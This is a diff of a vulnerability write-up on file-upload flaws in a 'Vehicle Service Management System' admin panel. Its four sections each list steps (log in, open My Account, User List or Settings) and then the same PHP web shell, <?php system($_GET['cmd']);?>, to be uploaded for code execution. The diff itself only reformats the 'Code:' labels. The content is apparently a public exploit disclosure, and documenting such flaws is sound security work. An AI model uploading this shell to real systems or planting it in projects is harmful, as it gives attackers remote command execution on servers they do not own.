@@ -21,8 +21,9 @@ Vehicle Service Management System - 'Multiple' File upload Leads to Code Executi
 1. Login to the admin panel http://localhost/vehicle_service/admin
 2. Navigate to My Account section http://localhost/vehicle_service/admin/?page=user
 
+
+### Code:
 ```html
-Code:
 <?php system($_GET['cmd']);?>
 ```
 
@@ -40,8 +41,8 @@ Code:
 1. Login to the admin panel http://localhost/vehicle_service/admin
 2. Navigate to User List section and click on Create New button.
 
+### Code:
 ```html
-Code:
 <?php system($_GET['cmd']);?>
 ```
 
@@ -59,8 +60,8 @@ Code:
 1. Login to the admin panel http://localhost/vehicle_service/admin
 2. Navigate to Settings section http://localhost/vehicle_service/admin/?page=system_info
 
+### Code:
 ```html
-Code:
 <?php system($_GET['cmd']);?>
 ```
 
@@ -78,8 +79,8 @@ Code:
 1. Login to the admin panel http://localhost/vehicle_service/admin
 2. Navigate to Settings section http://localhost/vehicle_service/admin/?page=system_info
 
+### Code:
 ```html
-Code:
 <?php system($_GET['cmd']);?>
 ```
 
